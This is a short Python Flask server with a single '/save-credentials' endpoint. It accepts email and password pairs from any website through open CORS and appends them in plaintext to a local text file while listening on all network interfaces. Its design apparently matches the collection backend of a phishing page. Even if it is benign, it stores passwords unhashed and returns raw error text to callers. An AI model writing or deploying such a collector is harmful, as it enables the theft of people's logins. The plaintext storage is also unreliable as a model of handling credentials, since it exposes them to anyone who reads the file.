from flask import Flask, request, jsonify
from flask_cors import CORS  # Import CORS

app = Flask(__name__)
CORS(app)  # Enable CORS for all origins

@app.route('/save-credentials', methods=['POST', 'OPTIONS'])
def save_credentials():
    # Handle OPTIONS preflight request
    if request.method == 'OPTIONS':
        return '', 200  # Respond with 200 OK to preflight requests
    
    try:
        # Get JSON data from the request body
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')

        # Save credentials to a text file (you can customize this)
        with open('credentials.txt', 'a') as file:
            file.write(f"Email: {email}\nPassword: {password}\n\n")

        return jsonify({"message": "Credentials saved successfully!"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 400

if __name__ == '__main__':
    # Run the server on all interfaces (0.0.0.0) and port 5000
    app.run(host='0.0.0.0', port=5000)
